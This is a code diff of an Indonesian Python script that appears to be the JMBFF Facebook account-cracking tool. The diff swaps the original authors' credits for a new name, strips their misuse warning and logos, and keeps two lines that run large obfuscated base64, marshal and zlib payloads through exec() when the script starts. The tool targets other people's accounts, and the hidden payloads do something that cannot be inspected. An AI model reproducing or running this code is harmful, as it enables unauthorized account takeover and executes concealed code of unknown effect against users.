@@ -2,25 +2,13 @@
 # coding=utf-8
 
 ##########################################
-#       DIBUAT OLEH JECKO RAMADHAN       #
-#   TEAM XNXCODE, XTCCODE, SYBER SNIPER  #
-# RISKY, AANG XD, YUMASA, SHOLEH, FIRMAN #
-# XENZI X, YUMEE ID, NOPAL XD, NAZRI XD  #
+#          DIBUAT OLEH SOAPQUEEN         #
+#   PLEASE FOLLOW INSTAGRAM & YOUTUBE    #
+#        INSTAGRAM : @soapqueen_s        #
+#          YOUTUBE : Soxoyisez           #
 ##########################################
 
-##########################################
-#          !!! PERINGATAN !!!            #
-#   JANGAN SALAH GUNAKAN TOOLS SEBAGAI   #
-# TEMPAT HAL BURUK GUNAKAN DENGAN BIJAK  #
-#  HINDARI DARI PENIPUAN ATAS TIRUAN SC  #
-##########################################
-"""
- SUPPOR JEECK X NANO :V
-       FOLLOW ME GITHUB : https://github.com/Jeeck-XD
-                          https://github.com/Jeeck-XN
- DONASI JEECK X NANO :V
-       DANA ME : 085891511849
-THX ALL :V
+
 """
 
 # <========== IMPORT MODULE PYTHON
@@ -231,26 +219,6 @@ def waktu(): # <========== WAKTU SAPAAN
 	elif 15 <= hours < 18:timenow = "good evening"
 	else:timenow = "good night"
 	return timenow
-def logo(): # <========== LOGO BUAT TAMPILAN JMBFF GTG
-	os.system("clear")
-	__nano__warna___gantenk__ = random.choice([W,K,I,U])
-	print(f"""
-{__nano__warna___gantenk__}______________  _____________________________
-{__nano__warna___gantenk__}______  /__   |/  /__  __ )__  ____/__  ____/   {J}•{U}--------------------------{J}•
-{__nano__warna___gantenk__}___ _  /__  /|_/ /__  __  |_  /_   __  /_       {J}•{N}     MADE IN INDONESIA    {J}•
-{__nano__warna___gantenk__}/ /_/ / _  /  / / _  /_/ /_  __/   _  __/       {J}•{N}   JEECK X NANO AND RISKY {J}•
-{__nano__warna___gantenk__}\____/  /_/  /_/  /_____/ /_/      /_/          {J}•{U}--------------------------{J}•          """) # <========== JANGAN DI UBAH ANJINK
-def log_log(): #<========= LOGO BUAT LOGIN BABI
-	os.system("clear")
-#	os.system("xdg-open https://facebook.com/jecko.ramadhan.9")
-	__nano__warna___gantenk__ = random.choice([W,K,I,U])
-	print(f"""
-{__nano__warna___gantenk__}______ ___________________________   __________________
-{__nano__warna___gantenk__}___  / __  __ \_  ____/___  _/__  | / /__  ____/__  __ \ {U}• {W}JEECK X NANO {U}•
-{__nano__warna___gantenk__}__  /  _  / / /  / __  __  / __   |/ /__  /_   __  __  |
-{__nano__warna___gantenk__}_  /___/ /_/ // /_/ / __/ /  _  /|  / _  __/   _  /_/ /
-{__nano__warna___gantenk__}/_____/\____/ \____/  /___/  /_/ |_/  /_/      /_____/
-""") #<========= LOGIN LOGO
 
 _ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'==AAQAAAAIwcAAAAB4TZsVHZv1GPIotP4xzA6DAAAIgcAAAACIHAp+VAaPWZ4VGBaLQKOl1dBFUQBFUQBFUQBFUQBFUQBFUQBFUQDFUQBFUUBFUQBhUTNFUQBFkWBJ0aBlVUBd1ZCtWQs1UQLFlTqFUQBFUQBFUQBFUQBFUQBF0QnFUQBFUWBFUQCRUQBFUQjhzbBFUQCZjRIFVQaFkRrF0bNN0bBdEaBhEMBRWQCtWQyE1Qnd3SnFUYFFkZRZ0aCh0dCFWUGlTQsNWQid2YCFUQFFUQRJEMB9WTBFUUCpVQHFlRmFlTrJkbwUUZqR3aCNDMGpVQot2QXF1SaFEdrRkS3VkZRpFMBNzdFd2dGVUQGBTcmFFZ4I0VR5kT3JUOChVUFF2ZWtGRudHRtdnQrR0M3FUb3NEZCh0dHZWQKtWRJBDRhdmW5MESRh0bBhGODtURCZWUstWRYdXSkdmQ5VFSRp0Z3FkQBhUR1RWQxd2QyE1UvFVRCFESRN0Z3FkQBhUR1Z1dCtWQG1UQBFVQCFUQFFEZB1GRBFURBdVUCtWQG1UQLJlTPV2ZsBjYyQHbilWNwUGSUFWQYpkND1mT2JmM0BnWTVDMlhEVhJUbOZnYyQHcahFcIFGSSBzYI1kNMlXOzQ2MjVnWtZkaadlS2JmMzVXWykDdMpXR31ERBpXTqV1MOpXT14kaNVjTTlzdiNjTwMWe4EjT61EMORVWy4kaNNjTUFUeORUS2BlMGd3YEFTbZ1mewF0dBFUQPtWQBFUQBVGaK52YtZ0dhNUNtl1VOxWWtljdhlXNqJmMxYzQXFDalNUMoplMVlTTI92QQpnQ2EWRxYXZtx2cidUR250U0cXSDhWWNRVR3kUR4BnYuZFNJh0Z04Eb4IjTDt2ZRhlQ3J2RWhlWXpEThhVU25EVNNDTq1kMJNEaMNlRS5EVDd3ZidEbyp1UChkWX5kcil3anFlMolnYyEDbMp3a0wkaBVnTENWMPNENy4UaCRVWXpFaj12a25EVNNDTq1kMLFlUhN0VGFDZHhmdj1GbwUGWv5UWyYkahdUV0llM5UHZIpkdih0bRNmMWpGTX50bMhlVox0VxYXWtx2cah1bLRGWOx2YpFDaaJjV1R2TrJUQBFUQllWNvRGSSd3Y69mdMJDZ5lFWC9GTtpFaZJjVpJmM5IHTt5kdiNVOy0EVNVXTDlDdaNVOtp1VWtGUygHci12c5UGav12YIZVaidEb6F2RWtGUUFUbZdlTqpFWOpHWzIldhJjV1B1UrN0VnR2badlRrpFWKp3VnRmaiJTOyF2VWpnMnpEcah0bmlESKRXSDFTealmQwImM0xmYpVDMlhUUnpUaZdWWykjdhJDbsxkbSRDZDtWTycmU2N2RWVnMnJVeadlRrJzZSxWZHxGMycmV5l1V14mWW9GRjJjV6JzZSdnYz4EMycmUwoFWoBzVnJVcjJTO1JzZWNnYyY0ajlzbFJ2VWVHZk92QiNDUhJkbOVzYzIFbiN1aLJzZWBjYyQHbix2bEllM5I3YnVUQBFkQhFkMstGZO9mRidEb0FGWUFWQXdTYC1Gasl1VSx2Y09mQlhUSLFUQBFkMnJ1aZhlUoFXUClnRnFUQBB1bEBFSntiMnRGdadVNxg1MO9WQnFUQBhUTxFUQBFUQnV0TBFFNCRUQFdUQRdmQCFURFFUUJJkQBV0TBF1dCNUQFVWQR9mQDFURJFkUJNkQ2t2RDF0dCNGanFUQBJ0TLFlR5dUQBFUQIl0VBFUQBNGaZFUQBJUeGdWQBFESJhVQBFUQyc2Z4I2V5sGZXhHbQdWRBFUQCpXQnFUQBF0dCBAAFgycCkCATFAZAEQADGwgAQWAlBQZAAAAQMHAAAAQAAAADAAAAAAAAAAAAAAAAAAAAAwY'))
 _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))
@@ -699,10 +667,4 @@ def result(): #<========= CHEK FILE CP DAN OK
 		menu() #<========= KEMBALI KE MENU TOOLS
 if __name__=='__main__':
 	menu() #<========= MAIN TO MAIN :V
-
-# OPEN SOURCE BY JEECK X NANO
-# AINK CAPE
- # DONASI :V KALO MAU NGAB SEBAGAI TANDA TERIMAKASI
- # NO DANA : 085891511849
- # THX : RISKY,AANG,ADEN,FIRMAN,ALDI,NAZRI,MELANIN,YOSHII :V
 
